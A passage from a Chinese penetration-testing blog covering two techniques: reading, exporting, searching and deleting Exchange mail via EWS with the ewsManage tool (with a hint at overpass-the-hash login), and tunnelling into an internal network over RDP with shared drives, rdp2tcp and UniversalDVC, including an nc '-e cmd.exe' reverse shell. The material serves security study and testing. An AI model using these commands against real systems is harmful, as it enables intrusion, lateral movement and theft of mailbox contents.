<p>https://docs.microsoft.com/en-us/exchange/client-developer/exchange-web-services/get-started-with-ews-client-applications</p>

<p>EWS请求和响应使用SOAP(Simple Object Access Protocol)协议</p>

<p>SOAP消息格式：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;SOAP-ENV:Envelope各种属性&gt;
　&lt;SOAP:HEADER&gt;
　&lt;/SOAP:HEADER&gt;
　&lt;SOAP:Body&gt;
　&lt;/SOAP:Body&gt;
&lt;/SOAP-ENV:Envelope&gt;
</code></pre></div></div>

<p>对应EWS的结构：</p>

<ul>
  <li>Envelope元素（必须），作为SOAP消息的标志</li>
  <li>Header元素（可选），可用来指定ExchangeServer的版本</li>
  <li>Body元素（必须），包含所有的调用和响应信息</li>
  <li>Fault 元素（可选），包含错误消息</li>
</ul>

<p>C Sharp代码示例（发送邮件）：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
using System.Net;
using System.IO;
using System.Text;
namespace EMAIL_EWS
{
    class Program
    {
        static void Main(string[] args)
        {
            String user = "test1";
            String password = "test123!";
            String readPath = ""
            ServicePointManager.ServerCertificateValidationCallback = (sender, certificate, chain, sslPolicyErrors) =&gt; { return true; };          
            StreamReader sendData = new StreamReader("ews.xml", Encoding.Default);
            byte[] sendDataByte = Encoding.UTF8.GetBytes(sendData.ReadToEnd());
            sendData.Close();
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://test.com/ews/Exchange.asmx");
                request.Method = "POST";
                request.ContentType = "text/xml";
                request.ContentLength = sendDataByte.Length;
                request.AllowAutoRedirect = false;
                request.Credentials = new NetworkCredential(user, password);
                Stream requestStream = request.GetRequestStream();
                requestStream.Write(sendDataByte, 0, sendDataByte.Length);
                requestStream.Close();

                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                if (response.StatusCode != HttpStatusCode.OK)
                {
                    throw new WebException(response.StatusDescription);
                }
                Stream receiveStream = response.GetResponseStream();
                
                StreamReader readStream = new StreamReader(receiveStream, Encoding.UTF8);

                String receiveString = readStream.ReadToEnd();
                response.Close();
                readStream.Close();

                StreamWriter receiveData = new StreamWriter("out.xml");
                receiveData.Write(receiveString);                         
                receiveData.Close();                                        
            }
            catch (WebException e)
            {
                Console.WriteLine("[!]{0}", e.Message);
                Environment.Exit(0);
            }
            Console.WriteLine("[+]Done");
        }
    }
}
</code></pre></div></div>

<p>代码读取文件ems.xml的内容并进行发送，将结果保存为out.xml</p>

<p>ems.xml的内容为发送邮件：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
               xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" 
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" 
               xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;
  &lt;soap:Header&gt;
    &lt;t:RequestServerVersion Version="Exchange2013_SP1" /&gt;
  &lt;/soap:Header&gt;
  &lt;soap:Body&gt;
    &lt;m:CreateItem MessageDisposition="SendAndSaveCopy"&gt;
      &lt;m:SavedItemFolderId&gt;
        &lt;t:DistinguishedFolderId Id="sentitems" /&gt;
      &lt;/m:SavedItemFolderId&gt;
      &lt;m:Items&gt;
        &lt;t:Message&gt;
          &lt;t:Subject&gt;This is Subject&lt;/t:Subject&gt;
          &lt;t:Body BodyType="HTML"&gt;This is Body&lt;/t:Body&gt;
          &lt;t:ToRecipients&gt;
            &lt;t:Mailbox&gt;
              &lt;t:EmailAddress&gt;test1@test.com&lt;/t:EmailAddress&gt;
              &lt;/t:Mailbox&gt;
          &lt;/t:ToRecipients&gt;
        &lt;/t:Message&gt;
      &lt;/m:Items&gt;
    &lt;/m:CreateItem&gt;
  &lt;/soap:Body&gt;
&lt;/soap:Envelope&gt;
</code></pre></div></div>

<p>返回的内容(out.xml)如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-11-7/3-2.png" alt="Alt text"></p>

<p><code class="language-plaintext highlighter-rouge">ResponseCode</code>为<code class="language-plaintext highlighter-rouge">NoError</code>，表示操作成功</p>

<p><strong>注：</strong></p>

<p>以上代码并不需要依赖文件<code class="language-plaintext highlighter-rouge">Microsoft.Exchange.WebServices.dll</code></p>

<p>当然，如果需要使用Autodiscover自动发现服务，还是需要依赖文件<code class="language-plaintext highlighter-rouge">Microsoft.Exchange.WebServices.dll</code></p>

<h2 id="0x05-开源实现代码ewsmanage">0x05 开源实现代码ewsManage</h2>
<hr>

<p>我将以上两种方法整合到一个工程，并添加了更多实用的功能，代码下载地址：</p>

<p>https://github.com/3gstudent/ewsManage</p>

<p>目前支持以下功能：</p>

<ul>
  <li>支持EWS Managed API和EWS SOAP</li>
  <li>支持使用用户名口令或者使用当前凭据登录邮箱</li>
  <li>支持是否忽略不可信证书</li>
  <li>列出指定位置的邮件，包括附件中的文件名称和邮件内容
（对邮件内容长度做判断，如果大于100个字符，只显示前100个字符的内容）</li>
  <li>列出指定位置的未读邮件，包括附件中的文件名称和邮件内容
（对邮件内容长度做判断，如果大于100个字符，只显示前100个字符的内容）</li>
  <li>列出指定位置中的自定义文件夹（遍历所有子文件夹）</li>
  <li>查看自定义文件下的所有邮件</li>
  <li>查看自定义文件下的未读邮件</li>
  <li>保存指定位置中的所有邮件(格式为eml)</li>
  <li>保存指定邮件中的附件（指定ID）</li>
  <li>向指定邮件添加附件（指定ID）</li>
  <li>删除指定邮件的附件（指定ID）</li>
  <li>删除指定邮件的所有附件</li>
  <li>搜索带有指定关键词的邮件（常见位置，搜索标题名，附件名称和邮件正文）</li>
  <li>删除指定邮件（指定ID）</li>
  <li>查看某个邮件的具体内容（指定ID）</li>
  <li>发送邮件(使用EWS SOAP)</li>
  <li>读取xml文件，通过EWS SOAP发送命令</li>
</ul>

<p>支持查询和操作的位置：</p>

<ul>
  <li>收件箱(Inbox)</li>
  <li>草稿(Drafts)</li>
  <li>已发送邮件(SentItems)</li>
  <li>已删除邮件(DeletedItems)</li>
  <li>发件箱(Outbox)</li>
  <li>垃圾邮件(JunkEmail)</li>
</ul>

<p>用法示例：</p>

<p>(1)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ewsManage.exe -CerValidation Yes -ExchangeVersion Exchange2013_SP1 -u test1 -p test123! -ewsPath https://test.com/ews/Exchange.asmx -Mode ListUnreadMail -Folder Inbox
</code></pre></div></div>

<p>使用证书验证，使用URL登录，查看收件箱的所有未读邮件，输出以下邮件信息：</p>

<ul>
  <li>Subject</li>
  <li>HasAttachments</li>
  <li>ItemId</li>
  <li>DateTimeCreated</li>
  <li>DateTimeReceived</li>
  <li>DateTimeSent</li>
  <li>DisplayCc:</li>
  <li>DisplayTo</li>
  <li>InReplyTo:</li>
  <li>Size</li>
  <li>MessageBody（如果大于100个字符，只显示前100个字符的内容）</li>
</ul>

<p>(2)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ewsManage.exe -CerValidation No -ExchangeVersion Exchange2013_SP1 -use the default credentials -AutodiscoverUrl test1@test.com -Mode ListMail -Folder SentItems
</code></pre></div></div>

<p>忽略证书验证，使用当前凭据自动登录，调用Autodiscover自动发现服务，查看所有已发送邮件的信息，输出的信息类别同(1)</p>

<p><strong>注：</strong></p>

<p>可以配合mimikatz的Overpass-the-hash，实现通过hash登录Exchange</p>

<p>(3)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ewsManage.exe -CerValidation No -ExchangeVersion Exchange2013_SP1 -u test1 -p test123! -ewsPath https://test.com/ews/Exchange.asmx -Mode ListFolder -Folder Inbox
</code></pre></div></div>

<p>忽略证书验证，使用URL登录，查看收件箱中所有自定义文件夹的信息，输出以下信息：</p>

<ul>
  <li>DisplayName</li>
  <li>Id</li>
  <li>TotalCount（该自定义文件夹下邮件的数量）</li>
</ul>

<p>(4)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ewsManage.exe -CerValidation No -ExchangeVersion Exchange2013_SP1 -u test1 -p test123! -ewsPath https://test.com/ews/Exchange.asmx -Mode ListMailofFolder -Id AAMaADFlMjRjMdM2LTgxZTUtNGRmZC05ZDQyLTMzNDFlMzBmZWY1NwAzAAAAAAAR9UOK286vT6HjUgukBQGmAQBHzR2O8KNmTcffGwlY0A76AAAAADfqAAA=
</code></pre></div></div>

<p>查看指定自定义文件夹（通过Id筛选）中的所有邮件，输出的信息类别同(1)</p>

<p>(5)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ewsManage.exe -CerValidation No -ExchangeVersion Exchange2013_SP1 -u test1 -p test123! -ewsPath https://test.com/ews/Exchange.asmx -Mode ExportMail -Folder Inbox
</code></pre></div></div>

<p>将收件箱的所有邮件保存为eml文件</p>

<p>(6)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ewsManage.exe -CerValidation No -ExchangeVersion Exchange2013_SP1 -u test1 -p test123! -ewsPath https://test.com/ews/Exchange.asmx -Mode SaveAttachment -Id AAMzADFlMjRjMzM3LTgxZTUzNGRmZC25ZDQyLTMaNDFlMzBwZWY1NwBGAAAAAAAR8UOK236vT6HjUnujBQGmBwBHzR1O8KNmTrjfGwlY0A56AAAAAAEKAABHzR1O8KNmTrjfGzlY2A75AAAAABxFAAA=
</code></pre></div></div>

<p>保存指定邮件（通过Id筛选）中的附件，输出路径为当前路径</p>

<p>(7)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ewsManage.exe -CerValidation No -ExchangeVersion Exchange2013_SP1 -u test1 -p test123! -ewsPath https://test.com/ews/Exchange.asmx -Mode AddAttachment -Id AAMzADFlMjRjMzM3LTgxZTUzNGRmZC25ZDQyLTMaNDFlMzBwZWY1NwBGAAAAAAAR8UOK236vT6HjUnujBQGmBwBHzR1O8KNmTrjfGwlY0A56AAAAAAEKAABHzR1O8KNmTrjfGzlY2A75AAAAABxFAAA= -AttachmentFile 1.txt
</code></pre></div></div>

<p>向指定邮件（通过Id筛选）添加附件，附件名称为1.txt</p>

<p>(8)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ewsManage.exe -CerValidation No -ExchangeVersion Exchange2013_SP1 -u test1 -p test123! -ewsPath https://test.com/ews/Exchange.asmx -Mode DeleteAttachment -Id AAMzADFlMjRjMzM3LTgxZTUzNGRmZC25ZDQyLTMaNDFlMzBwZWY1NwBGAAAAAAAR8UOK236vT6HjUnujBQGmBwBHzR1O8KNmTrjfGwlY0A56AAAAAAEKAABHzR1O8KNmTrjfGzlY2A75AAAAABxFAAA= -AttachmentFile 1.txt
</code></pre></div></div>

<p>删除指定邮件（通过Id筛选）中的某个附件，附件名称为1.txt</p>

<p>(9)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ewsManage.exe -CerValidation No -ExchangeVersion Exchange2013_SP1 -u test1 -p test123! -ewsPath https://test.com/ews/Exchange.asmx -Mode ClearAllAttachment -Id AAMzADFlMjRjMzM3LTgxZTUzNGRmZC25ZDQyLTMaNDFlMzBwZWY1NwBGAAAAAAAR8UOK236vT6HjUnujBQGmBwBHzR1O8KNmTrjfGwlY0A56AAAAAAEKAABHzR1O8KNmTrjfGzlY2A75AAAAABxFAAA=
</code></pre></div></div>

<p>删除指定邮件（通过Id筛选）中的所有附件</p>

<p>(10)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ewsManage.exe -CerValidation No -ExchangeVersion Exchange2013_SP1 -u test1 -p test123! -ewsPath https://test.com/ews/Exchange.asmx -Mode SearchMail -String vpn
</code></pre></div></div>

<p>搜索带有指定关键词为vpn的邮件</p>

<p>文件夹位置：</p>

<ul>
  <li>收件箱(Inbox)</li>
  <li>草稿(Drafts)</li>
  <li>已发送邮件(SentItems)</li>
  <li>已删除邮件(DeletedItems)</li>
  <li>发件箱(Outbox)</li>
  <li>垃圾邮件(JunkEmail)</li>
</ul>

<p>邮件位置：</p>

<ul>
  <li>标题名(Subject)</li>
  <li>附件名称(AttachmentName)</li>
  <li>邮件正文(Body)</li>
</ul>

<p>(11)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ewsManage.exe -CerValidation No -ExchangeVersion Exchange2013_SP1 -u test1 -p test123! -ewsPath https://test.com/ews/Exchange.asmx -Mode DeleteMail -Id AAMzADFlMjRjMzM3LTgxZTUzNGRmZC25ZDQyLTMaNDFlMzBwZWY1NwBGAAAAAAAR8UOK236vT6HjUnujBQGmBwBHzR1O8KNmTrjfGwlY0A56AAAAAAEKAABHzR1O8KNmTrjfGzlY2A75AAAAABxFAAA=
</code></pre></div></div>

<p>完全删除指定邮件（通过Id筛选）</p>

<p>(12)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ewsManage.exe -CerValidation No -ExchangeVersion Exchange2013_SP1 -u test1 -p test123! -ewsPath https://test.com/ews/Exchange.asmx -Mode ViewMail -Id AAMzADFlMjRjMzM3LTgxZTUzNGRmZC25ZDQyLTMaNDFlMzBwZWY1NwBGAAAAAAAR8UOK236vT6HjUnujBQGmBwBHzR1O8KNmTrjfGwlY0A56AAAAAAEKAABHzR1O8KNmTrjfGzlY2A75AAAAABxFAAA=
</code></pre></div></div>

<p>查看某个邮件的具体内容（指定ID）,包括完整的正文内容</p>

<p>(13)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ewsManage.exe -CerValidation No -ExchangeVersion Exchange2013_SP1 -u test1 -p test123! -ewsPath https://test.com/ews/Exchange.asmx -Mode ReadXML -Path ews.xml
</code></pre></div></div>

<p>读取ews.xml文件中的命令，通过EWS SOAP发送</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了两种访问Exchange资源的方法，开源工程ewsManage，便于后续的二次开发。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on November 11, 2018
  </div>

  
</article><article class="post">
  <h1>渗透技巧——使用远程桌面协议建立通道</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>最近从@cpl3h的博客中学到了使用远程桌面协议建立通道的方法。</p>

<p>本文将对这个方法进行整理，结合自己的经验，添加个人理解。</p>

<p>学习地址：</p>

<p>https://ijustwannared.team/2019/11/07/c2-over-rdp-virtual-channels/</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>使用场景</li>
  <li>使用共享文件建立通道</li>
  <li>使用rdp2tcp建立通道</li>
  <li>使用UniversalDVC建立通道</li>
  <li>利用分析</li>
  <li>防御建议</li>
</ul>

<h2 id="0x02-使用场景">0x02 使用场景</h2>
<hr>

<p>由于防火墙的设置，只能连接一台Windows服务器的远程桌面，那么如何以这台Windows服务器为跳板进入内网</p>

<p>简要描述如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-5/1-1.png" alt="Alt text"></p>

<h2 id="0x03-使用共享文件建立通道">0x03 使用共享文件建立通道</h2>
<hr>

<p>通过读写RDP Client和RDP Server之间共享的文件作为数据传输的通道</p>

<p>POC：</p>

<p>https://github.com/outflanknl/external_c2</p>

<p>这是根据Cobalt Strike中External C2规范编写的POC</p>

<h3 id="实现原理">实现原理：</h3>

<p>建立远程桌面连接时，RDP Client和RDP Server之间可以创建共享文件夹，通过读写共享文件作为数据传输的通道</p>

<h3 id="1windows系统连接远程桌面并开启文件共享">1.Windows系统连接远程桌面并开启文件共享</h3>

<h4 id="1通过配置mstscexe开启文件共享">(1)通过配置mstsc.exe开启文件共享</h4>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-5/1-2.png" alt="Alt text"></p>

<h4 id="2使用freerdp开启文件共享">(2)使用FreeRDP开启文件共享</h4>

<p>下载地址：</p>

<p>https://cloudbase.it/freerdp-for-windows-nightly-builds/</p>

<p>命令实例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfreerdp /v:192.168.112.129:3389 -u:1 -p:Test123! /cert-ignore /drive:share1,c:\
</code></pre></div></div>

<h3 id="2kali系统连接远程桌面并开启文件共享">2.Kali系统连接远程桌面并开启文件共享</h3>

<h4 id="1使用xfreerdp开启文件共享">(1)使用xfreerdp开启文件共享</h4>

<p>将本地文件夹<code class="language-plaintext highlighter-rouge">/tmp</code>共享的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xfreerdp /v:192.168.112.129:3389 /u:1 /p:Test123! /cert-ignore /drive:share1,/tmp
</code></pre></div></div>

<h4 id="2使用rdesktop开启文件共享">(2)使用rdesktop开启文件共享</h4>

<p>将本地文件夹<code class="language-plaintext highlighter-rouge">/tmp</code>共享的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rdesktop 192.168.112.129 -u1 -pTest123! -r disk:share1=/tmp
</code></pre></div></div>

<p>在RDP Server上，可通过<code class="language-plaintext highlighter-rouge">\\tsclient\</code>访问共享的文件资源</p>

<p>通过文件读写来传输数据的具体细节可参考xpn的文章：</p>

<p>https://blog.xpnsec.com/exploring-cobalt-strikes-externalc2-framework/</p>

<h2 id="0x04-使用rdp2tcp建立通道">0x04 使用rdp2tcp建立通道</h2>
<hr>

<p>rdp2tcp使用RDP虚拟通道功能来复用端口</p>

<p>可用的功能：</p>

<ul>
  <li>正向TCP端口转发</li>
  <li>反向TCP端口转发</li>
  <li>处理标准输入/输出转发</li>
  <li>SOCKS5代理</li>
</ul>

<p>POC：</p>

<p>https://github.com/V-E-O/rdp2tcp</p>

<p>测试系统： Kali2 x64</p>

<h3 id="1下载并编译rdp2tcp">1.下载并编译rdp2tcp</h3>

<h4 id="1安装mingw-w64">(1)安装mingw-w64</h4>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt-get install mingw-w64
</code></pre></div></div>

<h4 id="2下载rdp2tcp">(2)下载rdp2tcp</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/V-E-O/rdp2tcp.git
cd rdp2tcp
</code></pre></div></div>

<h4 id="3修改配置文件">(3)修改配置文件</h4>

<p>rdp2tcp默认不支持编译64位的exe，所以这里需要修改配置文件，增加编译64位exe的配置信息</p>

<p>修改文件<code class="language-plaintext highlighter-rouge">Makefile</code>，新的内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>all: client server-mingw64

client: client/rdp2tcp
client/rdp2tcp:
	make -C client

#server-mingw32: server/rdp2tcp.exe
#server/rdp2tcp.exe:
#	make -C server -f Makefile.mingw32

server-mingw64: server/rdp2tcp64.exe
server/rdp2tcp64.exe:
	make -C server -f Makefile.mingw64

clean:
	make -C client clean
#	make -C server -f Makefile.mingw32 clean
	make -C server -f Makefile.mingw64 clean
	make -C tools clean
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>因为我们使用了64位的操作系统，并且安装了64位的mingw，所以这里设置为生成64位的exe</p>

<p>新建文件<code class="language-plaintext highlighter-rouge">/server/Makefile.mingw64</code>，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BIN=rdp2tcp64.exe
CC=i686-w64-mingw32-gcc
CFLAGS=-Wall -g \
		 -D_WIN32_WINNT=0x0501 \
		 -I../common

# -D_WIN32_WINNT=0x0501
# -D_WIN32_WINNT=0x0501 -DDEBUG

LDFLAGS=-lwtsapi32 -lws2_32
OBJS=	../common/iobuf.o \
	../common/print.o \
	../common/msgparser.o \
	../common/nethelper.o \
	../common/netaddr.o \
	errors.o aio.o events.o \
	tunnel.o channel.o process.o commands.o main.o

all: clean_common $(BIN)

clean_common:
	$(MAKE) -C ../common clean

$(BIN): $(OBJS)
	$(CC) -o $@ $(OBJS) $(LDFLAGS) 

%.o: %.c
	$(CC) $(CFLAGS) -o $@ -c $&lt;

clean:
	rm -f $(OBJS) $(BIN)
</code></pre></div></div>

<h4 id="4编译">(4)编译</h4>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>make
</code></pre></div></div>

<p>生成以下文件:</p>

<ul>
  <li>/server/rdp2tcp64.exe</li>
  <li>/client/rdp2tcp</li>
</ul>

<h3 id="2安装xfreerdp">2.安装xfreerdp</h3>

<p>Kali系统默认安装的xfreerdp不支持TCP重定向的功能</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-5/2-2.png" alt="Alt text"></p>

<p>如果支持TCP重定向的功能，程序回显的内容如下</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-5/2-1.png" alt="Alt text"></p>

<p>需要重新下载编译xfreerdp，这里我使用的版本是freerdp-nightly</p>

<p>参考链接：</p>

<p>https://ci.freerdp.com/job/freerdp-nightly-binaries/</p>

<p>这里我使用的发行版为bionic，完整的安装命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "deb http://pub.freerdp.com/repositories/deb/bionic/ freerdp-nightly main " &gt;&gt;/etc/apt/sources.list
wget -O - http://pub.freerdp.com/repositories/ADD6BF6D97CE5D8D.asc | sudo apt-key add -
apt-get update
apt-get install freerdp-nightly
</code></pre></div></div>

<p>对应的安装路径为<code class="language-plaintext highlighter-rouge">/opt/freerdp-nightly</code></p>

<p>启动新版的xfreerdp，对应的路径为: <code class="language-plaintext highlighter-rouge">/opt/freerdp-nightly/bin/xfreerdp</code></p>

<p>新版的xfreerdp支持TCP重定向，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-5/2-3.png" alt="Alt text"></p>

<h3 id="3使用xfreerdp连接远程桌面并建立通道">3.使用xfreerdp连接远程桌面并建立通道</h3>

<p>这里介绍正向TCP端口转发的方法</p>

<h4 id="1执行xfreerdp并开启tcp重定向功能">(1)执行xfreerdp并开启TCP重定向功能</h4>

<p>Kali系统上执行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/freerdp-nightly/bin/xfreerdp /v:192.168.112.129:3389 /u:1 /p:Test123! /cert-ignore /rdp2tcp:/root/rdp2tcp/client/rdp2tcp
</code></pre></div></div>

<h4 id="2将rdp2tcp64exe上传至rdp-server并执行不需要管理员权限">(2)将rdp2tcp64.exe上传至RDP Server并执行(不需要管理员权限)</h4>

<p>执行结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-5/2-4.png" alt="Alt text"></p>

<h4 id="3在kali系统上启动rdp2tcppy">(3)在Kali系统上启动rdp2tcp.py</h4>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd rdp2tcp/tools
python rdp2tcp.py
</code></pre></div></div>

<p>添加正向端口转发(本地445-&gt;192.168.112.129:445)的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python rdp2tcp.py add forward 127.0.0.1 445 192.168.112.129 445
</code></pre></div></div>

<p>输出结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-5/3-1.png" alt="Alt text"></p>

<h4 id="4访问本地445端口">(4)访问本地445端口</h4>

<p>访问本地445端口的数据被转发至192.168.112.129的445端口，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-5/3-2.png" alt="Alt text"></p>

<p>正向端口转发建立成功</p>

<h2 id="0x05-使用universaldvc建立通道">0x05 使用UniversalDVC建立通道</h2>
<hr>

<p>UniversalDVC是以注册UDVC插件的形式，使用动态虚拟通道建立通道</p>

<p>POC：</p>

<p>https://github.com/earthquake/UniversalDVC</p>

<p>测试系统： Win7 x64</p>

<h3 id="1安装udvc插件">1.安装UDVC插件</h3>

<p>下载编译好的64位文件，地址如下：</p>

<p>https://github.com/earthquake/UniversalDVC/files/1880297/UDVC-x64.zip</p>

<p>将其中64位的dll保存在<code class="language-plaintext highlighter-rouge">%windir%\system32</code>下</p>

<p>注册dll的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>regsvr32.exe UDVC-Plugin.x64.dll
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-5/4-1.png" alt="Alt text"></p>

<p>UDVC插件注册后将创建注册表项用来保存配置信息</p>

<p>配置文件的位置：<code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default\AddIns\UDVC-Plugin</code></p>

<p>默认监听的端口为31337</p>

<p><strong>注：</strong></p>

<p>在RDP Server启动UDVC-Server.exe后，UDVC插件才会开启监听端口</p>

<h3 id="2实现端口转发的功能">2.实现端口转发的功能</h3>

<h4 id="1将mode设置为socket-server-mode-0---default">(1)将Mode设置为<code class="language-plaintext highlighter-rouge">Socket server mode (0 - default)</code></h4>

<p>修改注册表的cmd命令为:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add "hkcu\Software\Microsoft\Terminal Server Client\Default\AddIns\UDVC-Plugin" /v mode /t REG_DWORD /d 0 /f
</code></pre></div></div>

<h4 id="2设置监听端口为1234">(2)设置监听端口为1234</h4>

<p>修改注册表的cmd命令为:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add "hkcu\Software\Microsoft\Terminal Server Client\Default\AddIns\UDVC-Plugin" /v port /t REG_SZ /d 1234 /f
</code></pre></div></div>

<h4 id="3启动远程桌面客户端">(3)启动远程桌面客户端</h4>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mstsc.exe
</code></pre></div></div>

<p>连接远程桌面</p>

<h4 id="4rdp-server启动udvc-serverexe">(4)RDP Server启动UDVC-Server.exe</h4>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>UDVC-Server.x64.exe -c -p 80 -i 192.168.112.129 -0
</code></pre></div></div>

<h4 id="5rdp-client打开浏览器并访问http1270011234">(5)RDP Client打开浏览器并访问http://127.0.0.1:1234</h4>

<p>获得内网192.168.112.129:80的数据</p>

<p>通道建立完成，简要流程图如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-5/4-2.png" alt="Alt text"></p>

<h3 id="3实现反弹shell的功能">3.实现反弹shell的功能</h3>

<p>RDP Server反弹一个shell至RDP Client</p>

<p>RDP Client能够实时控制RDP Server，执行cmd命令</p>

<h4 id="1将mode设置为socket-client-mode-1">(1)将Mode设置为<code class="language-plaintext highlighter-rouge">Socket client mode (1)</code></h4>

<p>修改注册表的cmd命令为:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add "hkcu\Software\Microsoft\Terminal Server Client\Default\AddIns\UDVC-Plugin" /v mode /t REG_DWORD /d 1 /f
</code></pre></div></div>

<h4 id="2设置监听端口为1234-1">(2)设置监听端口为1234</h4>

<p>修改注册表的cmd命令为:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add "hkcu\Software\Microsoft\Terminal Server Client\Default\AddIns\UDVC-Plugin" /v port /t REG_SZ /d 1234 /f
</code></pre></div></div>

<h4 id="3启动远程桌面客户端-1">(3)启动远程桌面客户端</h4>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mstsc.exe
</code></pre></div></div>

<p>连接远程桌面</p>

<h4 id="4rdp-client使用nc监听本地端口1234">(4)RDP Client使用nc监听本地端口1234</h4>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc64.exe -lvp 1234
</code></pre></div></div>

<h4 id="5rdp-server启动udvc-serverexe">(5)RDP Server启动UDVC-Server.exe</h4>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>UDVC-Server.x64.exe -p 5678 -0
</code></pre></div></div>

<p>此时将建立一条动态虚拟通道：RDP Server-&gt;RDP Client:1234</p>

<p>并且RDP Server开启监听端口5678</p>

<h4 id="6rdp-server使用nc连接本地端口5678并指定重定向的程序为cwindowssystem32cmdexe">(6)RDP Server使用nc连接本地端口5678并指定重定向的程序为<code class="language-plaintext highlighter-rouge">c:\windows\system32\cmd.exe</code></h4>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc64.exe 127.0.0.1 5678 -e c:\windows\system32\cmd.exe
</code></pre></div></div>

<p>通道建立完成，简要流程图如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-5/4-3.png" alt="Alt text"></p>

<h2 id="0x06-利用分析">0x06 利用分析</h2>
<hr>

<p>对于这三种建立通道的方法(共享文件、rdp2tcp和UniversalDVC)，利用前提是已经获得了连接远程桌面的权限</p>

<p>严格地说，利用这台远程桌面服务器，就已经能够对内网资源进行访问</p>

<p>研究这种方法的意义在于某些情况下远程桌面服务器无法运行我们的程序</p>

<p>例如远程桌面服务器为Windows系统，而我们想执行的程序只支持Linux，这就避免了考虑程序移植的问题</p>

